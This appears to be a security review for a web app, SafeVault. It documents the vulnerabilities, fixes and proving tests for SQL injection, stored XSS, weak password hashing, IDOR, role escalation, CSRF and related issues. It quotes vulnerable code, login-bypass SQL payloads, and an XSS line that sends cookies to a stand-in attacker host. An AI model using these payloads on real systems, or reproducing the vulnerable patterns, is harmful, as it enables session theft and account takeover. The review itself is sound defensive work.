# Security review: vulnerabilities, fixes and evidence

This document records what was wrong in the earlier drafts of SafeVault, why it was wrong,
what replaced it, and which test proves the fix. The pre-fix code is kept in
[`docs/vulnerable-samples/`](docs/vulnerable-samples/) for reference; it is not compiled and is
never reachable at runtime.

Every "proving test" below fails if the fix is removed. They are integration tests against the
real application, not unit tests of a helper.

---

## 1. SQL injection in sign-in and search

**Severity:** critical (authentication bypass, full table disclosure).

**Vulnerable code** (`VulnerableLogin`, kept in `docs/vulnerable-samples/login-sql.txt`):

```csharp
var sql = "SELECT Id, Username, PasswordHash, Role FROM Users " +
          "WHERE Username = '" + username + "'";
```

Submitting `admin' --` makes the predicate `Username = 'admin' --'`, which comments out the
rest of the statement and matches the administrator row. `' OR '1'='1` matches the first row in
the table. The same pattern appeared in the item search, where a payload could return every
user's rows.

**Fix.** Every value travels as a parameter, so the database parses the statement once and the
input can only ever be a value:

```csharp
command.CommandText =
    "SELECT Id, Username, PasswordHash, Role FROM Users " +
    "WHERE Username = $username COLLATE NOCASE LIMIT 1;";
command.Parameters.AddWithValue("$username", username);
```

Search needed a second fix: even with a parameter, `%` and `_` inside the term are wildcards,
so searching for `%` returned every row. The term is escaped and the escape character is
declared in the statement:

```csharp
command.CommandText = """
    SELECT Id, OwnerId, Title, Content, CreatedUtc
    FROM VaultItems
    WHERE OwnerId = $ownerId
      AND (Title LIKE $pattern ESCAPE '\' OR Content LIKE $pattern ESCAPE '\')
    """;
command.Parameters.AddWithValue("$pattern", "%" + EscapeLike(search.Trim()) + "%");
```

**Proving tests**

- `SqlInjectionTests.Repository_TreatsPayloadAsLiteralUsername` (5 payloads)
- `SqlInjectionTests.Login_WithTautologyPayload_DoesNotAuthenticate`
- `SqlInjectionTests.Login_WithCommentPayload_DoesNotLogInAsAdmin`
- `SqlInjectionTests.Search_WithTautologyPayload_ReturnsOnlyTheSignedInUsersItems`
- `SqlInjectionTests.Search_PercentSign_IsMatchedLiterallyInsteadOfMatchingEverything`
- `SqlInjectionTests.Search_Underscore_IsMatchedLiterally`
- `SqlInjectionTests.Registration_WithSqlMetacharactersInUsername_IsRejectedBeforeItReachesSql`

**Reproduce**

```bash
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' \
  -d 'Input.Username=admin%27%20--' -d 'Input.Password=anything' \
  -d "__RequestVerificationToken=$TOKEN" https://localhost:7081/Account/Login
# 200 with "Username or password is incorrect"; no session is issued.
```

## 2. Stored cross-site scripting in vault content

**Severity:** high (session theft, actions performed as the victim).

**Vulnerable code** (`docs/vulnerable-samples/vault-detail-xss.txt`):

```cshtml
<pre class="vault-content">@Html.Raw(Model.Item.Content)</pre>
```

`Html.Raw` writes the stored value into the document unencoded. An item body of
`<img src=x onerror="fetch('https://attacker.example?c='+document.cookie)">` executes for every
user who opens the page — never for the author, which is what makes stored XSS easy to miss.

**Fix, in three layers.**

1. **Encode on output, do not strip on input.** Validation deliberately accepts markup
   (`InputValidator.ValidateItem` returns valid for `<script>`), because removing it destroys
   legitimate text and still misses attribute and JavaScript contexts. Razor's default
   `@Model.Item.Content` encoding is the control.
2. **One audited markup path.** Search highlighting needs to emit `<mark>`, so it is the only
   place that returns HTML — and it encodes the text first, then searches inside the encoded
   string:

   ```csharp
   var encoded = Encode(text);        // <img ...> becomes &lt;img ...
   var needle  = Encode(term);
   // wrap matches in <mark> ... </mark>, never the raw input
   ```
3. **Assume encoding will fail one day.** The CSP has no `unsafe-inline` and no `unsafe-eval`,
   so an injected `<script>` element cannot execute; `nosniff` stops content-type confusion;
   `frame-ancestors 'none'` blocks clickjacking.

The JSON API is also covered: responses are `application/json` with HTML-sensitive characters
escaped, and `/api/items/{id}/content` is `text/plain` + `nosniff`, so a stored payload is
returned as characters rather than rendered.

**Proving tests**

- `XssTests.StoredScriptPayload_IsEncodedOnTheDetailPage`
- `XssTests.StoredImagePayload_IsEncodedOnTheDetailPage`
- `XssTests.StoredScriptPayload_IsEncodedInTheListPage`
- `XssTests.SearchHighlight_EncodesTheMatchItWraps`
- `XssTests.JsonApi_ReturnsJson_NotHtml`
- `XssTests.RawContentEndpoint_IsPlainTextAndNotSniffed`
- `XssTests.SecurityHeaders_ArePresentWithARestrictiveContentSecurityPolicy`
- `XssTests.Highlight_EncodesBeforeItAddsMarkup`

**Reproduce:** create an item titled `Smoke <script>alert(1)</script>` and open it. The page
source contains `&lt;script&gt;` and no `<script` at all.

## 3. Unsalted, fast password hashing

**Severity:** high (offline cracking after any database leak).

**Vulnerable code**

```csharp
var hash = Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(password)));
```

A single SHA-256 is designed to be fast; a GPU tests billions of guesses per second, and
without a salt the same password produces the same hash in every row, so one rainbow table
cracks every account at once.

**Fix.** PBKDF2-HMAC-SHA256, 210,000 iterations, a 16-byte random salt per hash, and
`CryptographicOperations.FixedTimeEquals` for comparison. The stored format carries its own
version and cost, so the iteration count can be raised later without invalidating existing
users:

```
v1$210000$<base64 salt>$<base64 derived key>
```

A missing account is verified against a dummy hash so that response time does not reveal
whether the username exists.

**Proving tests**

- `PasswordHashingTests.Hash_DoesNotContainThePassword`
- `PasswordHashingTests.Hash_UsesAFreshSaltEachTime`
- `PasswordHashingTests.Hash_RecordsItsVersionIterationsAndSalt`
- `PasswordHashingTests.Verify_RejectsMalformedStoredValues`
- `PasswordHashingTests.Verify_RejectsAbsurdIterationCounts`
- `PasswordHashingTests.StoredPassword_IsHashedNotPlainText`

## 4. Broken access control on item ids (IDOR)

**Severity:** high (read or delete another user's data by changing one number).

**Vulnerable code**

```csharp
var item = repository.GetById(id);      // no ownership condition
return Page(item);
```

Authentication answered "is somebody signed in", not "is this their record". Item `3` was
readable by anyone who could guess the number, and the same handler deleted without a check.

**Fix.** Ownership is part of the SQL predicate for writes and part of the decision for reads,
taken from the authenticated claims rather than from the request:

```csharp
var item = repository.GetById(id);
if (item is null || !User.CanAccess(item.OwnerId))   // own record, or an Admin
{
    return NotFound();                               // 404, not 403
}
```

`404` rather than `403` is deliberate: `403` confirms that the id exists, which is exactly what
enumeration is looking for.

**Proving tests**

- `AuthorizationTests.OrdinaryUser_CannotOpenAnotherUsersItemPage`
- `AuthorizationTests.OrdinaryUser_CannotReadAnotherUsersItemThroughTheApi`
- `AuthorizationTests.ApiList_OnlyReturnsTheSignedInUsersItems`
- `AuthorizationTests.OrdinaryUser_CannotDeleteAnotherUsersItem`
- `AuthorizationTests.Administrator_CanReadAnyItem`

## 5. Role handling that allowed privilege escalation

Two separate defects:

**5a. Role value trusted from the request.** The first admin handler wrote whatever `role`
string it received, so a crafted POST could store `SuperAdmin` (or later, a role the code did
not expect). Fixed with an allow-list, a `CHECK` constraint in the schema, and a page-level
role requirement:

```csharp
if (!Roles.IsKnown(role)) return BadRequest("Unknown role.");
```

New registrations are always created as `User`; only an administrator can grant `Admin`. An
administrator also cannot change their own role, so administration cannot be locked out by a
single click.

**5b. `AuthorizeFolder("/Admin", "Admin")` is not a role check.** The second argument of that
overload is a **policy name**. No policy called `Admin` was registered, so every request to the
folder failed with `500` — including for anonymous users. The test suite caught this; the fix
is to require authentication on the folder and keep the role requirement on the page model:

```csharp
options.Conventions.AuthorizeFolder("/Admin");   // authentication
[Authorize(Roles = Roles.Admin)]                  // role, on the page model
```

**Proving tests**

- `AuthorizationTests.OrdinaryUser_CannotOpenTheAdminPage`
- `AuthorizationTests.OrdinaryUser_ChangingSomeonesRole_IsBlocked`
- `AuthorizationTests.Administrator_CanPromoteAnotherUser`
- `AuthorizationTests.Administrator_CannotRemoveTheirOwnRole`
- `AuthenticationTests.AnonymousRequest_ToVault_IsRedirectedToLogin`

## 6. Cross-site request forgery and missing brute-force limits

**CSRF.** Cookie authentication means a browser attaches credentials to a request started by
another site. Every state-changing operation is therefore `POST` with an antiforgery token
(Razor Pages validates it automatically) and the auth cookie is `SameSite=Lax`:

```csharp
options.Cookie.SameSite = SameSiteMode.Lax;
```

`AuthenticationTests.PostWithoutAnAntiforgeryToken_IsRejected` asserts the `400`.

**Brute force.** `LoginThrottle` counts failures per username and client address; five failures
lock the account for a minute even if the correct password follows. The check happens before
the password is verified.

`AuthenticationTests.FiveFailedAttempts_LockTheAccountOut_EvenWithTheCorrectPassword` asserts
the lockout text and that no session is issued.

## 7. User enumeration, open redirect and information leakage

| Issue | Fix | Test |
| --- | --- | --- |
| Distinct messages for "no such user" and "wrong password" | One message: *Username or password is incorrect* | `AuthenticationTests.UnknownUsername_ProducesTheSameMessageAsAWrongPassword` |
| Timing difference between the two cases | Verify against a dummy hash when no row matches | covered by the same test plus `PasswordHashingTests` |
| `ReturnUrl` accepted from the query string | `Url.IsLocalUrl` before redirecting | `AuthenticationTests.ReturnUrl_PointingOffSite_IsIgnored` |
| Stack traces and internal details in errors | Generic error page outside Development | `Pages/Error.cshtml` |
| Pages cached by a shared proxy | `Cache-Control: no-store` on pages | `XssTests.SecurityHeaders_...` |
| Missing browser hardening headers | CSP, `nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer` | `XssTests.SecurityHeaders_...` |

## 8. Insecure defaults

The seeded administrator is the classic "admin/admin" trap. The seeder requires
`SafeVault__SeedAdminPassword` outside Development and refuses to start without it; the
development fallback is documented, logged as a warning, and never used in production. The
database file is git-ignored so a real hash is not committed by accident.

---

## Residual risks

- The lockout is per process and in memory: a restart clears it and multiple instances do not
  share counters.
- Rate limiting is account-scoped; there is no global request throttle.
- No password reset, MFA or session revocation list. Compromised cookies remain valid until
  they expire (30 minutes sliding).
- SQLite is a single file with no encryption at rest; file-system permissions are the control.
- The security headers are a strong defence in depth, but the primary XSS control is output
  encoding. Removing the encoding would be a vulnerability even with the CSP in place.
